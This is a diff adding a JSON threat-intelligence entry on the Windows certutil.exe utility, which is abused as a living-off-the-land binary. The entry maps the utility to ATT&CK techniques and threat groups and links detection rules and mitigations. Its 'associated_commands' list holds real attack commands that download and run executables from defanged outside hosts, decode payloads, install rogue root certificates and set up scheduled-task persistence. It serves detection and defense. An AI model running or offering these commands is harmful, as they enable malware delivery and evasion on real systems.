@@ -1,0 +1,137 @@
+{
+  "type": "lolbin",
+  "version": 1,
+  "id": "bdf4a55c-3539-47dc-90b4-d9fcd2e55202",
+  "created_by_ref": "@Nounou_Mbeiri",
+  "created": "2023-08-15T00:00",
+  "modified": "2023-08-15T00:00",
+  "name": "Certutil.exe",
+  "description": "Command-line utility that can be used to obtain certificate authority information and configure Certificate Services.",
+  "Required_privilege": [
+    "User"
+  ],
+  "paths": [
+    "c:\\windows\\system32\\certutil.exe",
+    "c:\\windows\\syswow64\\certutil.exe"
+  ],
+  "hashe": "09A8A29BAA3A451713FD3D07943B4A43",
+  "associated_kill_chain_phases": [
+    "TA0009:Collection:T1560.001",
+    "TA0005:Defense Evasion:T1140",
+    "TA0011:Command and Control:T1105",
+    "TA0005:Defense Evasion:T1553.004 "
+  ],
+  "capabilities": [
+    "Download",
+    "Encode",
+    "Alternate data streams"
+  ],
+  "relationship": [
+    {
+      "associated_apts": [
+        "APT28",
+        "APT41",
+        "Earth Lusca",
+        "Higaisa",
+        "menuPass",
+        "OilRig",
+        "Rancor",
+        "Threat Group-3390",
+        "Turla",
+        "Volt Typhoon"
+      ],
+      "associated_campaigns": [
+        "N/A"
+      ],
+      "associated_commands": [
+        "certutil  -urlcache -split -f http://91.208.184[.]78/2.exe",
+        "certutil.exe -decode 1.txt l.exe",
+        "certutil -addstore -f -user ROOT ProgramData\\cert512121.der",
+        "C:\\Windows\\System32\\cmd.exe /k certutil -urlcache -split -f hxxp://220.158.216[.]127/MScertificate.exe & MScertificate.exe",
+        "cmd /c certutil.exe -urlcache -split -f http:\\\\dlj40s.jdanief[.]xyz/images/1.pdf C:\\ProgramData\\1.pdf&start",
+        "C:\\ProgramData\\1.pdf /c certutil.exe -urlcache -split -f http:\\\\dlj40s.jdanief[.]xyz/images/1.pdf C:\\ProgramData\\1.pdf&start C:\\ProgramData\\1.pdf",
+        "SchTasks /Create /SC MINUTE /MO 2 /TN \"LocalReportHealth\" /TR \"cmd.exe /c certutil -decode %localappdata%\\srvBS.txt %localappdata%\\srvHealth.exe && schtasks /DELETE /tn LocalReportHealth /f && del %localappdata%\\srvBS.txt\"",
+        "C:\\Windows\\System32\\cmd.exe /c certutil -decode C:\\ProgramData\\padre1.txt C:\\ProgramData\\GUP.txt",
+        "cd %temp% && certutil -urlcache -split -f http://0[.]18.154/debug.exe &&debug.exe"
+      ],
+      "pre_and_next_related_cmd": [
+        {
+          "pre_cmd_event": [
+            "msiexec /q /i",
+            "wscript *\\Microsoft\\microsoft.vbs",
+            "/m file.lnk /c cmd /c echo f|xcopy",
+            "SchTasks /Create /SC",
+            "wmic process call create cmd.exe /c"
+          ],
+          "next_cmd_event": [
+            "cmd.exe /c reg add",
+            "Service.exe Add /freg add",
+            "SchTasks /Create /SC",
+            "C:\\Windows\\System32\\esentutl.exe /y C:\\ProgramData\\GUP.txt /d C:\\ProgramData\\GUP.exe /o",
+            "wmic process call create cmd.exe /c"
+          ]
+        }
+      ]
+    }
+  ],
+  "platforms": [
+    "windows"
+  ],
+  "detections": [
+    {
+      "eventsid": [
+        {
+          "sysmon": [
+            "T1560.001:process:process_creation:log_channel:Microsoft-Windows-Sysmon/Operational:log_provider:Microsoft-Windows-Sysmon:1",
+            "T1560.001:file:file_creation:log_channel:Microsoft-Windows-Sysmon/Operational:log_provider:Microsoft-Windows-Sysmon:11",
+            "T1140:file:file_modification:log_channel:Microsoft-Windows-Sysmon/Operational:log_provider:Microsoft-Windows-Sysmon:2",
+            "T1105:network_traffic:network_connection_creation:log_channel:Microsoft-Windows-Sysmon/Operational:log_provider:Microsoft-Windows-Sysmon:3",
+            "T1553.004:windows_registry:windows_registry_key_creation:log_channel:Microsoft-Windows-Sysmon/Operational:log_provider:Microsoft-Windows-Sysmon:12"
+          ],
+          "windows": [
+            "T1560.001:process:process_creation:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:4688",
+            "T1560.001:command:command_execution:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:4103",
+            "T1140:file:file_modification:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:4670",
+            "T1140:script:script_execution:log_channel:Microsoft-Windows-PowerShell/Operational:log_provider:Microsoft-Windows-PowerShell:4104",
+            "T1105:network_traffic:network_connection_creation:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:5156",
+            "T1105:network_traffic:network_connection_creation:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:5157",
+            "T1105:windows_registry:windows_registry_key_modification:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:4657"
+          ]
+        }
+      ],
+      "sigma_rules": [
+        "https://raw.githubusercontent.com/SigmaHQ/sigma/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_certutil_certificate_installation.yml",
+        "https://raw.githubusercontent.com/SigmaHQ/sigma/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_certutil_decode.yml",
+        "https://raw.githubusercontent.com/SigmaHQ/sigma/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_certutil_download.yml",
+        "https://raw.githubusercontent.com/SigmaHQ/sigma/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_certutil_encode.yml",
+        "https://raw.githubusercontent.com/SigmaHQ/sigma/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_certutil_export_pfx.yml"
+      ],
+      "other_rules": [
+        "https://raw.githubusercontent.com/splunk/security_content/develop/dev_ssa/endpoint/ssa___windows_certutil_decode_file.yml",
+        "https://raw.githubusercontent.com/splunk/security_content/develop/dev/endpoint/certutil_download_with_urlcache_and_split_arguments.yml",
+        "https://raw.githubusercontent.com/splunk/security_content/develop/detections/endpoint/certutil_exe_certificate_extraction.yml",
+        "https://raw.githubusercontent.com/elastic/detection-rules/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/command_and_control_certutil_network_connection.toml"
+      ]
+    }
+  ],
+  "related_CVE": [
+    "CVE-2022-21894",
+    "CVE-2022-41040"
+  ],
+  "mitigations": [
+    "Implement security measures that prevent or detect the use of Certutil for malicious purposes.",
+    "Application Whitelisting: Maintain a whitelist of approved applications and prevent the execution of unauthorized tools",
+    "EDR: Deploy EDR solutions that monitor endpoint activities in real-time",
+    "Network Monitoring: Employ network monitoring tools to detect unusual data transfers or communication patterns that might indicate the use of certutil for malicious purposes.",
+    "Least Privilege: Limit user privileges to only what is necessary for their roles. This can reduce the potential impact of an attacker leveraging legitimate tools.",
+    "T1560.001:M1047:Audit: System scans can be performed to identify unauthorized archival utilities.",
+    "T1105:M1031:Network Intrusion Prevention: Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known protocols like FTP can be used to mitigate activity at the network level.",
+    "T1553.004:M1028:Operating System Configuration Windows Group Policy can be used to manage root certificates and the Flags value of HKLM\\SOFTWARE\\Policies\\Microsoft\\SystemCertificate\\Root\\ProtectedRoots can be set to 1 to prevent non-administrator users from making further root installations into their own HKCU certificate store."
+  ],
+  "references": [
+    "https://attack.mitre.org/software/S0160",
+    "https://app.tidalcyber.com/software/2fe21578-ee31-4ee8-b6ab-b5f76f97d043-certutil",
+    "https://lolbas-project.github.io/lolbas/Binaries/Certutil",
+    "https://strontic.github.io/xcyclopedia/library/certutil.exe-09A8A29BAA3A451713FD3D07943B4A43.html"
+  ]
+}
